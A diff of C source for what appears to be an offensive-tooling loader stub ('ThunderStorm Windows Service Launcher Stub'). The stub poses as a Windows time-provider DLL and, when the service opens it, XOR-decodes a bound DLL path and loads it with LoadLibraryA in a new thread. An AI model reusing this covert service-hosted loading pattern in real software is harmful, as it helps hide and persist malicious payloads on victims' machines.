@@ -1,3 +1,18 @@
+// Copyright (C) 2021 iDigitalFlame
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with this program.  If not, see <https://www.gnu.org/licenses/>.
+//
 // ThunderStorm Windows Service Launcher Stub
 //  Loads a bound DLL path into the hosting process to prevent
 //  direct load crashes.
@@ -19,7 +34,7 @@
 #include <timeprov.h>
 #include <winsplp.h>
 
-#define STACK_SIZE 256000000
+#define STACK_SIZE 512000000*2
 #define EXPORT __declspec(dllexport)
 
 // Included with auto-build
@@ -67,7 +82,7 @@ EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) 
     return HRESULT_FROM_WIN32(0x00000307);
 }
 EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHandle *p) {
-    #ifndef XOR
+    #ifdef XOR
         Xor(pacKey, KEY_SIZE, pacData, PAC_SIZE-1);
     #endif
     CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)LoadLibraryA, pacData, 0, NULL);
